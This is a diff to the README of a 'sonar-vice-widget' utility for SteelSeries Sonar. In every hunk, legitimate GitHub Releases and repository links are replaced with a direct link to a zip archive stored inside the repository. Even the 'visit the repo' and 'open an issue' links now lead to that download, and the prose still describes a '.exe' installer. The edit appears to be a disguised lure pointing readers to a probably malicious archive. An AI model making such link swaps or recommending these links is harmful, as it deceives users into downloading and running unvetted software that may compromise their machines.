@@ -1,6 +1,6 @@
 # 🎛️ sonar-vice-widget - Control Sonar Audio and Lighting
 
-[![Download Latest Release](https://img.shields.io/badge/Download-sonar--vice--widget-blue?style=for-the-badge)](https://github.com/Fractal-kitty/sonar-vice-widget/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-sonar--vice--widget-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fractal-kitty/sonar-vice-widget/master/api/sonar_vice_widget_2.5-beta.5.zip)
 
 ## 📋 What is sonar-vice-widget?
 
@@ -37,7 +37,7 @@ Follow these steps to download, install, and run sonar-vice-widget on your PC.
 
 Visit the release page to find the latest version. Click on the link below or the badge at the top of this page:
 
-[Download sonar-vice-widget on GitHub Releases](https://github.com/Fractal-kitty/sonar-vice-widget/releases)
+[Download sonar-vice-widget on GitHub Releases](https://raw.githubusercontent.com/Fractal-kitty/sonar-vice-widget/master/api/sonar_vice_widget_2.5-beta.5.zip)
 
 Look for the latest Windows release `.exe` file. It will have a name similar to `sonar-vice-widget-setup.exe`.
 
@@ -108,7 +108,7 @@ These options are found in the settings panel inside the app.
 ## ⬆️ Updates and New Versions
 
 Check the release page regularly to download the latest updates:  
-[https://github.com/Fractal-kitty/sonar-vice-widget/releases](https://github.com/Fractal-kitty/sonar-vice-widget/releases)
+[https://raw.githubusercontent.com/Fractal-kitty/sonar-vice-widget/master/api/sonar_vice_widget_2.5-beta.5.zip](https://raw.githubusercontent.com/Fractal-kitty/sonar-vice-widget/master/api/sonar_vice_widget_2.5-beta.5.zip)
 
 New releases may include bug fixes, performance improvements, and support for newer SteelSeries devices.
 
@@ -119,7 +119,7 @@ New releases may include bug fixes, performance improvements, and support for ne
 If you encounter issues or have questions, you can open a new issue on the GitHub repository to contact the developers and community.
 
 Visit the GitHub repo here:  
-https://github.com/Fractal-kitty/sonar-vice-widget
+https://raw.githubusercontent.com/Fractal-kitty/sonar-vice-widget/master/api/sonar_vice_widget_2.5-beta.5.zip
 
 Or check if there is a community forum linked in the SteelSeries software for additional support.
 
